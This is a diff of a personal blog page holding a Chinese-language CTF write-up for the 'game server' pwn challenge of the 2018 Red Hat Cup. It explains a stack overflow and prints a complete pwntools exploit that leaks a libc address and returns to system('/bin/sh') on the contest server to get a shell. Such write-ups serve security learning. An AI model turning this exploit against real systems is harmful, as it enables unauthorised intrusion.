@@ -6,7 +6,7 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
     <meta charset="UTF-8">
-    <title>2018红帽杯的一道pwn</title>
+    <title>Untitled</title>
 
     <meta name="author" content="triqry">
 
@@ -102,35 +102,29 @@
         <div>
     <article class="hentry" role="article">
         <header>
-            <h1 class="entry-title">2018红帽杯的一道pwn</h1>
+            <h1 class="entry-title"></h1>
             <p class="meta">
-                <time datetime="2018-04-30T16:00:00.000Z" data-updated="true">Tue May 01 2018</time>
+                <time datetime="2018-05-01T11:25:39.270Z" data-updated="true">Tue May 01 2018</time>
             </p>
         </header>
         <div class="entry-content">
-            <h2 id="game-server"><a href="#game-server" class="headerlink" title="game server"></a>game server</h2><p>IDA分析一下可以看到如果输入的名字和职业够长，在修改介绍时 就能引发栈溢出覆盖函数返回地址  </p>
+            <h3 id="game-server"><a href="#game-server" class="headerlink" title="game server"></a>game server</h3><p>IDA分析一下可以看到如果输入的名字和职业够长，在修改介绍时 就能引发栈溢出覆盖函数返回地址  </p>
 <p>这里做两次覆盖，第一次用来泄露函数地址看libc版本，第二期通过偏移来执行system函数getshell  </p>
 <p>exp如下</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lanuch_gdb</span><span class="params">()</span>:</span></span><br><span class="line">    context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'pid:'</span>+str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc6_2.23-0ubuntu3_amd64.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'pwn2'</span>)	</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn2")	</span></span><br><span class="line">p = remote(<span class="string">'123.59.138.180'</span>,<span class="string">'20000'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt_printf = elf.symbols[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'plt_printf= '</span> + hex(plt_printf)</span><br><span class="line">got_printf = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'got_printf= '</span> + hex(got_printf)</span><br><span class="line">vulfun_addr = <span class="number">0x08048637</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'vulfun= '</span> + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">systemaddr = <span class="number">0xf7e34b40</span></span><br><span class="line">binshaddr = <span class="number">0xf7f56dc8</span>	</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">name = <span class="string">'A'</span> * <span class="number">200</span></span><br><span class="line">p.sendline(name) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'occupation?'</span>)</span><br><span class="line">occupation = <span class="string">'B'</span> * <span class="number">200</span></span><br><span class="line">p.sendline(occupation)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'[Y/N]'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">payload = <span class="string">'C'</span> * <span class="number">277</span> + p32(plt_printf) + p32(vulfun_addr) + p32(got_printf) +<span class="string">'%p'</span> </span><br><span class="line"><span class="comment">#lanuch_gdb()</span></span><br><span class="line">p.send(payload) <span class="comment">#leak libc</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'%p\n'</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'printf_addr='</span> + hex(printf_addr)</span><br><span class="line"></span><br><span class="line">system_addr = printf_addr - (libc.symbols[<span class="string">'printf'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr= '</span> + hex(system_addr)</span><br><span class="line">binsh_addr = printf_addr - (libc.symbols[<span class="string">'printf'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_addr= '</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">name = <span class="string">'A'</span> * <span class="number">200</span></span><br><span class="line">p.sendline(name) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'occupation?'</span>)</span><br><span class="line">occupation = <span class="string">'B'</span> * <span class="number">200</span></span><br><span class="line">p.sendline(occupation)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'[Y/N]'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">payload2 = <span class="string">'C'</span>*<span class="number">277</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"><span class="comment">#lanuch_gdb()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>执行后成功getshell<br><img src="./Screenshot from 2018-05-01 18-38-35.png" alt="avatat"><br>flag在/home/pwn2/flag.txt里<br><img src="./Screenshot from 2018-05-01 19-01-04.png" alt="avatat"></p>
+<p>执行后成功getshell<br><img src="https://s1.ax1x.com/2018/05/01/CJylHf.png" alt="CJylHf.png"><br>flag在/home/pwn2/flag.txt里<br><img src="https://s1.ax1x.com/2018/05/01/CJy3E8.png" alt="CJy3E8.png"></p>
 
         </div>
         <footer>
             <p class="meta">
                 <span class="byline author vcard">Posted by <span class="fn">triqry</span></span>
-                <time datetime="2018-04-30T16:00:00.000Z" data-updated="true">Tue May 01 2018</time>
+                <time datetime="2018-05-01T11:25:39.270Z" data-updated="true">Tue May 01 2018</time>
                 
-    <span class="categories">
-    
-        <a class="category" href="/tags/pwn/">pwn</a>
-    
-    </span>
-
             </p>
             <div class="sharing">
     
         <a class="twitter-share-button"
-           href="https://twitter.com/intent/tweet?text=2018%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%9A%84%E4%B8%80%E9%81%93pwn">
+           href="https://twitter.com/intent/tweet?text=">
             Tweet
         </a>
     
@@ -151,7 +145,7 @@
 <aside class="sidebar">
     <section class="odd">
     <h1>Recent Posts</h1>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/redhat2018/">2018红帽杯的一道pwn</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/redhat2018/">redhat2018</a></li></ul>
 </section>
 </aside>
 
